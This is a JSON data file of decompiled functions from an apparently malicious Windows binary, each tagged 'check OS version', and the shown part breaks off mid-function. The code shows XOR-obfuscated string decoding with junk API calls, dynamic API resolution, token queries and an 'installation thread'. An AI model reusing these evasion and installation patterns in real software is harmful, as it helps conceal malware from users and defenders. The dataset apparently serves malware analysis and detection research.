{
    "00401092": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00401092(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_44h;\n    uint var_40h;\n    uint var_39h;\n    uint var_35h;\n    uint var_31h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    code *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t *hHeap;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_10h = 0;\n    iVar6 = -0x3fffffdd;\n    if ((((param_1 != NULL) && (param_2 != NULL)) && (*param_1 != 0)) && (hHeap = param_1[1],  hHeap != NULL)) {\n        if (*param_1 == *hHeap) {\n            var_44h = 0x701e1b38;\n            var_40h._0_2_ = 0xf2e;\n            var_18h = 5;\n            var_40h._2_1_ = 5;\n            stack0xffffffbf = 0x2e460202;\n            var_39h = 0x72d191f;\n            var_35h = 0x18092d52;\n            var_31h._0_1_ = 0x6f;\n            var_2ch = 0x34726f6a;\n            var_28h._0_2_ = 0x6c4b;\n            var_24h = param_2;\n            var_20h = param_1;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar7 = 0;\n            var_14h = &var_44h - iVar6;\n            var_1ch = iVar6;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetCursor)();\n                if (iVar4 != 0xc7c53c) {\n                    var_ch = 6;\n                    *(iVar7 + iVar6) = *(&var_2ch + iVar7 % 6) ^ (iVar7 + iVar6)[var_14h];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x14);\n            stack0xffffffcc = 0x3b2f1723;\n            var_2ch = 0x27076358;\n            var_28h._0_2_ = 0x343b;\n            var_ch = 0x574b634d;\n            var_8h._0_1_ = 0x34;\n            uVar3 = (*pcVar1)(8, 0xb);\n            iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            var_14h = &var_31h + (1 - iVar7);\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_CreateMenu)();\n                iVar4 = var_1ch;\n                if (iVar5 != 0x86a4c2) {\n                    *(iVar6 + iVar7) = *(&var_ch + iVar6 % var_18h) ^ (iVar6 + iVar7)[var_14h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 10);\n            uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar7, var_1ch);\n            var_1ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n            uVar3 = (*pcVar1)(8, hHeap[1]);\n            var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = *hHeap;\n            var_20h = var_20h[1] + 0xc;\n            fcn.00401000();\n            piVar2 = hHeap;\n            iVar6 = (*var_1ch)(2, var_ch, hHeap[1], var_20h, iVar6 + -0xc, &var_10h);\n            hHeap = iVar6;\n            if (iVar6 == 0) {\n                if (var_10h == piVar2[1]) {\n                    var_24h[1] = var_ch;\n                    *var_24h = var_10h;\n                }\n                else {\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    iVar6 = -0x3fffff85;\n                }\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n            pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*pcVar1)(uVar3);\n        }\n        else {\n            iVar6 = -0x3fffff85;\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 1277
    },
    "00401b0b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00401b0b(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uchar *var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint hObject;\n    int32_t lpLibFileName;\n    uint dwBytes;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    code *var_4h;\n    \n    puVar9 = &var_7ch;\n    var_58h = param_2;\n    for (iVar6 = 0x18; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_64h = *0x41db58;\n    var_60h = 0;\n    dwBytes = 0;\n    var_54h = 0;\n    var_10h = 0x3b2f1723;\n    var_ch = 0x27076358;\n    var_8h._0_2_ = 0x343b;\n    var_40h = 0x574b634d;\n    var_3ch._0_1_ = 0x34;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_30h = 0x5;\n    iVar7 = 0;\n    lpLibFileName = iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar3 != 0x86a4c2) {\n            *(iVar7 + iVar6) = *(&var_40h + iVar7 % var_30h) ^ (iVar7 + iVar6)[&var_10h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_14h = 0x17350e1c;\n    var_10h = 0x8292801;\n    var_ch = 0xa230708;\n    var_8h._0_2_ = 0x6709;\n    var_38h = 0x677a7946;\n    var_34h._0_1_ = 100;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    var_40h = iVar6;\n    var_4h = &var_14h - iVar6;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0xc8433e) {\n            *(iVar7 + iVar6) = *(&var_38h + iVar7 % var_30h) ^ (&var_14h - iVar6)[iVar7 + iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_7ch = 0x18;\n    var_78h = 0;\n    var_70h = 0;\n    var_74h = 0;\n    var_6ch = 0;\n    var_68h = 0;\n    iVar7 = (*pcVar5)(&var_50h, 0x400, &var_7ch, &var_64h);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (-1 < iVar7) {\n        var_28h._0_1_ = 0x3d;\n        var_28h._1_1_ = 0x23;\n        var_28h._2_2_ = 0x1b7f;\n        var_24h._0_2_ = 0x1601;\n        var_24h._2_2_ = 0x2637;\n        var_20h._0_2_ = 0x85f;\n        var_20h._2_2_ = 0xb01;\n        var_1ch._0_2_ = 0x14;\n        var_1ch._2_2_ = 0x5f;\n        var_18h._0_2_ = 0x1601;\n        var_18h._2_2_ = CONCAT11(var_18h._3_1_, 0x67);\n        var_ch = 0x6b305467;\n        var_8h._0_2_ = 0x7864;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_38h = iVar6;\n        var_4h = &var_28h - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_CloseClipboard)();\n            iVar3 = lpLibFileName;\n            if (iVar4 != 0x9ea4a2) {\n                var_4h = 0x6;\n                *(iVar7 + iVar6) = *(&var_ch + iVar7 % 6) ^ (&var_28h - iVar6)[iVar7 + iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x13);\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        iVar7 = (*pcVar5)(var_50h, 8, &hObject);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (-1 < iVar7) {\n            var_2ch = 0x20b192d;\n            var_28h._0_1_ = 0x16;\n            var_28h._1_1_ = 5;\n            var_28h._2_2_ = 0x1317;\n            var_24h._0_2_ = 0x1519;\n            var_24h._2_2_ = 0x1c18;\n            var_20h._0_2_ = 0x1637;\n            var_20h._2_2_ = 0x1e07;\n            var_1ch._0_2_ = 0x3401;\n            var_1ch._2_2_ = 0x1c23;\n            var_18h._0_2_ = 0xb1c;\n            var_18h._2_2_ = 0x7734;\n            var_ch = 0x775a6e77;\n            var_8h._0_2_ = CONCAT11(var_8h._1_1_, 0x73);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar7 = 0;\n            var_5ch = iVar6;\n            var_4h = &var_2ch - iVar6;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                iVar3 = lpLibFileName;\n                if (iVar4 != 0xfb94f) {\n                    *(iVar7 + iVar6) = *(&var_ch + iVar7 % var_30h) ^ (iVar7 + iVar6)[&var_2ch - iVar6];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x18);\n            uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n            var_4h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            (*var_4h)(hObject, 1, 0, 0, &dwBytes);\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes);\n            var_30h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (var_30h != NULL) {\n                iVar7 = (*var_4h)(hObject, 1, var_30h, dwBytes, &dwBytes);\n                if (-1 < iVar7) {\n                    puVar8 = *var_30h;\n                    puVar10 = var_58h;\n                    for (iVar6 = 0x1c; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar8;\n                        puVar8 = puVar8 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    var_54h = 1;\n                    iVar6 = var_5ch;\n                    iVar3 = lpLibFileName;\n                }\n                uVar2 = (*pcVar5)(0, var_30h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            uVar2 = (*pcVar5)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            iVar6 = var_38h;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_50h);\n        uVar2 = (*pcVar5)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        iVar6 = var_40h;\n    }\n    uVar2 = (*pcVar5)(0, iVar6);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar5)(0, iVar3);\n    (*pcVar1)(uVar2);\n    return var_54h;\n}\n",
        "token_count": 2538
    },
    "null": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    code *pcVar5;\n    uchar *puVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    code *pcVar10;\n    uint uVar11;\n    uint uStack308;\n    uint uStack304;\n    uint uVar12;\n    uint uStack276;\n    uint uStack268;\n    uchar *puStack264;\n    uchar *puStack260;\n    int32_t iStack256;\n    uint uStack252;\n    uchar *puStack248;\n    uchar uStack244;\n    uchar uStack243;\n    uchar uStack242;\n    uint uStack241;\n    uchar uStack237;\n    uchar uStack236;\n    ushort uStack235;\n    uchar uStack233;\n    uchar uStack232;\n    ushort uStack231;\n    uchar uStack229;\n    int32_t iStack228;\n    uint uStack224;\n    int32_t iStack220;\n    uint uStack204;\n    ushort uStack180;\n    uchar uStack178;\n    uint32_t uStack177;\n    uint uStack173;\n    uint32_t uStack169;\n    uchar uStack165;\n    ushort uStack164;\n    uchar uStack162;\n    uint uStack161;\n    uint uStack157;\n    uint uStack153;\n    uint uStack149;\n    uint32_t uStack145;\n    uchar uStack141;\n    unkbyte3 Stack140;\n    uint uStack137;\n    uint uStack133;\n    uint uStack129;\n    uchar uStack125;\n    uchar uStack124;\n    uchar uStack123;\n    ushort uStack122;\n    uchar uStack120;\n    int32_t iStack96;\n    uint uStack92;\n    uchar auStack64 [20];\n    uint uStack44;\n    int32_t iStack32;\n    uint uStack20;\n    \n    pcVar10 = _sym.imp.KERNEL32.dll_GetCurrentProcessId;\n    uStack204 = 0x4030be;\n    uStack204 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    uVar1 = (*pcVar10)();\n    iStack220 = 0x4030ce;\n    fcn.00401f6b(0x4108f0, uVar1);\n    pcVar10 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    uStack20 = 0;\n    uStack204 = 0;\n    (*_sym.imp.KERNEL32.dll_SetErrorMode)();\n    (*pcVar10)();\n    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uStack180 = 0x7124;\n    uStack178 = 0x15;\n    uStack177 = 0xb443f03;\n    uStack173 = 0x1b1f2b7e;\n    uStack169 = uStack169 & 0xffffff00 | 0x39;\n    uStack124 = 0x77;\n    uStack123 = 0x39;\n    uStack122 = 0x4f50;\n    uStack120 = 0x73;\n    iStack220 = 0x40311a;\n    iStack220 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack224 = 0x403121;\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    Stack140 = 5;\n    uStack137 = uStack137 & 0xffffff00;\n    iVar8 = 0;\n    iStack32 = iVar2;\n    do {\n        uStack224 = 0x403144;\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar3 != 0x3d25d0) {\n            *(iVar8 + iVar2) =\n                 (&stack0xffffff78)[iVar8 % CONCAT13(uStack137, Stack140)] ^ (iVar8 + iVar2)[&stack0xffffff40 + -iVar2];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xc);\n    uStack224 = 0x14;\n    iStack228 = 8;\n    uStack180 = 0x5927;\n    uStack178 = 0xe;\n    uStack177 = 0x5b0834;\n    uStack173 = 0xc370a7a;\n    uStack169 = 0x11770b61;\n    uStack165 = 0x3e;\n    uStack164 = 0x621f;\n    uStack162 = 100;\n    uStack232 = 0xa9;\n    uStack231 = 0x4031;\n    uStack229 = 0;\n    uVar1 = (*pcVar10)();\n    uStack232 = uVar1;\n    uStack231 = uVar1 >> 8;\n    uStack229 = uVar1 >> 0x18;\n    uStack236 = 0xb0;\n    uStack235 = 0x4031;\n    uStack233 = 0;\n    uVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iStack220 = 6;\n    uStack145 = uStack145 & 0xffffff00 | uVar4 >> 0x18;\n    iVar2 = 0;\n    puVar9 = &stack0xffffff40 + -uVar4;\n    do {\n        uStack236 = 0xd0;\n        uStack235 = 0x4031;\n        uStack233 = 0;\n        iVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar8 != 0x7f5e81) {\n            *(iVar2 + uVar4) = (&stack0xffffff34)[iVar2 % iStack220] ^ (iVar2 + uVar4)[puVar9];\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x13);\n    uStack236 = uVar4;\n    uStack235 = uVar4 >> 8;\n    uStack233 = uVar4 >> 0x18;\n    uStack241._1_3_ = uStack44;\n    uStack237 = uStack44 >> 0x18;\n    uStack244 = 3;\n    uStack243 = 0x32;\n    uStack242 = 0x40;\n    uStack241._0_1_ = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    uStack244 = uVar1;\n    uStack243 = uVar1 >> 8;\n    uStack242 = uVar1 >> 0x10;\n    uStack241._0_1_ = uVar1 >> 0x18;\n    puStack248 = 0x40320a;\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    puStack248 = 0x403212;\n    uStack252 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    puStack248 = &stack0xffffffc0;\n    iStack256 = 0x40321d;\n    uVar1 = (*pcVar5)();\n    iStack256 = 0x208;\n    puStack260 = 0x8;\n    uStack232 = uVar1;\n    uStack231 = uVar1 >> 8;\n    uStack229 = uVar1 >> 0x18;\n    puStack264 = 0x40322a;\n    puStack264 = (*pcVar10)();\n    uStack268 = 0x403231;\n    puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack268 = 0x104;\n    puVar9 = puVar6;\n    for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    uStack276 = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)();\n    *0x41db48 = puVar6;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    fcn.00401f6b(\"<%d>: WINMAIN.CPP:%d > WinMain : g_CurrentModulePath=%ws\", uVar1);\n    if (1 < iStack96) {\n        puStack248 = *(iStack256 + 4);\n        iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrIW)();\n        if (iVar2 != 0) {\n            iStack256 = 0;\n            do {\n                uStack92 = 0;\n                iVar2 = fcn.004044bb(&stack0xffffffa4);\n                if ((iVar2 == 0) && (iVar2 = fcn.004047cf(uStack92),  iVar2 == 0)) {\n                    pcVar10 = NULL;\n                    puVar9 = &stack0xffffff4c;\n                    for (iVar2 = 0x44; iVar2 != 0; iVar2 = iVar2 + -1) {\n                        *puVar9 = 0;\n                        puVar9 = puVar9 + 1;\n                    }\n                    uStack180 = 0x44;\n                    uStack178 = 0;\n                    uStack177 = uStack177 & 0xffffff00;\n                    puVar9 = &stack0xffffff14;\n                    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n                        *puVar9 = 0;\n                        puVar9 = puVar9 + 1;\n                    }\n                    uStack304 = 0;\n                    uStack308 = 0;\n                    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, puStack248);\n                    goto code_r0x00403353;\n                }\n                (*_sym.imp.KERNEL32.dll_Sleep)();\n                iStack256 = iStack256 + 1;\n            } while (iStack256 < 10);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    iVar2 = fcn.00409f1e();\n    if (iVar2 != 1) goto code_r0x00403359;\n    fcn.0040af8c();\n    (*pcVar10)();\n    (*_sym.imp.KERNEL32.dll_HeapFree)();\ncode_r0x00403353:\n    while( true ) {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)();\ncode_r0x00403359:\n        uStack236 = 0x3c;\n        uStack235 = 0x244d;\n        uStack233 = 0x68;\n        uStack232 = 0x33;\n        uStack231 = 0x2248;\n        uStack229 = 0x4d;\n        iStack228 = 0x48696834;\n        uStack224 = 0x682f4d34;\n        iStack220 = 0x4d514822;\n        iStack256 = 0x68574d51;\n        uStack252 = CONCAT22(uStack252._2_2_, 0x4847);\n        (*pcVar10)();\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n        iVar8 = 0;\n        puStack260 = &stack0xffffff08 + -iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetCursor)();\n            if (iVar3 != 0x93e0a9) {\n                *(iVar8 + iVar2) = (&stack0xfffffef4)[iVar8 % 0] ^ (iVar8 + iVar2)[puStack260];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x14);\n        (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n        iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrIW)();\n        if (iVar2 == 0) {\n            fcn.00402fb9();\n        }\n        uStack304 = 8;\n        uStack180 = 0x547f;\n        uStack178 = 6;\n        uStack177 = 0x26320732;\n        uStack173 = 0x41645d6f;\n        uStack169 = 0x2320054;\n        uStack165 = 0x32;\n        uStack164 = 0x6f20;\n        uStack162 = 0x6e;\n        uStack161 = 0x1547b64;\n        uStack157 = 0x31321032;\n        uStack153 = 0x5c64406f;\n        uStack149 = 0x10320a54;\n        uStack145 = 0x776f7432;\n        uStack141 = 100;\n        Stack140 = 0x1f544a;\n        uStack137 = 0x3b320832;\n        uStack133 = 0x5764406f;\n        uStack129 = 0x38321d54;\n        uStack125 = 0x32;\n        uStack124 = 0x54;\n        uStack123 = 0x6f;\n        uStack308 = 0x4034de;\n        uStack308 = (*pcVar10)();\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n        iVar8 = 0;\n        puVar9 = &stack0xffffff2c + -iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetInputState)();\n            if (iVar3 != 0x21171d) {\n                *(iVar8 + iVar2) = (&stack0xfffffed8)[iVar8 % iStack228] ^ (iVar8 + iVar2)[puVar9];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x4e);\n        uStack268 = 0x70025116;\n        puStack264 = 0x51223312;\n        puStack260 = 0x51566b04;\n        iStack256 = 0x3339703c;\n        uStack252 = 0x6b1f513e;\n        puStack248 = 0x70745147;\n        uStack244 = 0x37;\n        uStack243 = 0x33;\n        uStack242 = 5;\n        uStack241 = 0x406b1151;\n        uStack237 = 0x51;\n        uStack236 = 0x3a;\n        uStack235 = 0x1870;\n        uStack233 = 0x33;\n        uStack232 = 0xd;\n        uStack231 = 0x7051;\n        uStack229 = 0x6b;\n        uVar12 = 0x70515133;\n        uVar1 = (*pcVar10)(8, 0x51);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar8 = 0;\n        puVar9 = &stack0xfffffee8 + -iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n            if (iVar3 != 0x86b8f5) {\n                *(iVar8 + iVar2) =\n                     (&stack0xfffffecc)[iVar8 % CONCAT13(uStack237, uStack241._1_3_)] ^ (iVar8 + iVar2)[puVar9];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x28);\n        uVar1 = (*pcVar10)(8);\n        puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        uVar11 = 0x208;\n        uVar7 = (*pcVar10)(8, 0x208);\n        puStack264 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n        for (iVar8 = 0x208; pcVar5 = _sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW,  iVar8 != 0; iVar8 = iVar8 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        puVar6 = puStack264;\n        for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        pcVar10 = 0x208;\n        (*pcVar5)(0x208, uVar1, 0x104);\n        uVar1 = uStack276;\n        (*pcVar5)(iVar2, 0, 0x104);\n        iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(*0x41db48, pcVar10);\n        if ((iVar8 != 0) || (iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(*0x41db48, uVar12),  iVar8 != 0)) break;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0xd8);\n        uStack304 = 0x40366c;\n        fcn.00401f6b(\"<%d>: WINMAIN.CPP:%d > WinMain : start installation thread\", uVar1);\n        fcn.0040777c();\n        fcn.0040964c();\n    }\n    uVar12 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0xcc);\n    fcn.00401f6b(\"<%d>: WINMAIN.CPP:%d > WinMain : start work thread\", uVar12);\n    uVar7 = 0;\n    uVar12 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040660a, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar12);\n    uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar10);\n    pcVar10 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar12);\n    uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar11);\n    (*pcVar10)(uVar12);\n    (*_sym.imp.KERNEL32.dll_Sleep)(0xffffffff);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*pcVar10)(uVar12);\n    uVar12 = (*pcVar5)(0, 0x208);\n    (*pcVar10)(uVar12);\n    uVar1 = (*pcVar5)(0, uVar1);\n    (*pcVar10)(uVar1);\n    uVar1 = (*pcVar5)(0, uVar7);\n    (*pcVar10)(uVar1);\n    uVar1 = (*pcVar5)(0, puVar9);\n    (*pcVar10)(uVar1);\n    return;\n}\n",
        "token_count": 4211
    },
    "00404883": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00404883(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t hFindFile;\n    uint var_2ch;\n    int32_t var_28h;\n    int16_t *var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t lpString2;\n    int32_t var_ch;\n    uint8_t *lpFindFileData;\n    int32_t lpFileName;\n    \n    iVar7 = 8;\n    var_20h = 0x104;\n    var_34h = fcn.00404449();\n    lpString2 = in_ECX;\n    if (var_34h != 0) {\n        lpString2 = var_34h;\n    }\n    var_1ch = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    if (lpFileName != 0) {\n        uVar1 = (*pcVar5)(8, var_1ch * 2 + 0xc);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (var_14h != 0) {\n            uVar1 = (*pcVar5)(8, 0x250);\n            lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (lpFindFileData != NULL) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                var_ch = 0x66434f09;\n                hFindFile = 0x66434f55;\n                var_2ch._0_1_ = 0x67;\n                uVar1 = (*pcVar5)(8, 9);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                var_18h = 5;\n                iVar4 = 0;\n                var_28h = iVar7;\n                do {\n                    iVar2 = (*_sym.imp.USER32.dll_GetMessagePos)();\n                    if (iVar2 != 0x5733d2) {\n                        *(iVar4 + iVar7) = *(&hFindFile + iVar4 % var_18h) ^ (iVar4 + iVar7)[&var_ch - iVar7];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 4);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, iVar7);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(var_14h, lpString2);\n                var_40h = 0x7364452c;\n                var_3ch = 0x4e6f707c;\n                var_38h._0_2_ = 0x5273;\n                hFindFile = 0x734e4570;\n                var_2ch._0_1_ = 0x52;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar4 = 0;\n                var_24h = &var_40h - iVar7;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_GetFocus)();\n                    iVar2 = var_14h;\n                    if (iVar3 != 0x15ce03) {\n                        *(iVar4 + iVar7) = *(&hFindFile + iVar4 % var_18h) ^ *((&var_40h - iVar7) + iVar4 + iVar7);\n                    }\n                    iVar4 = iVar4 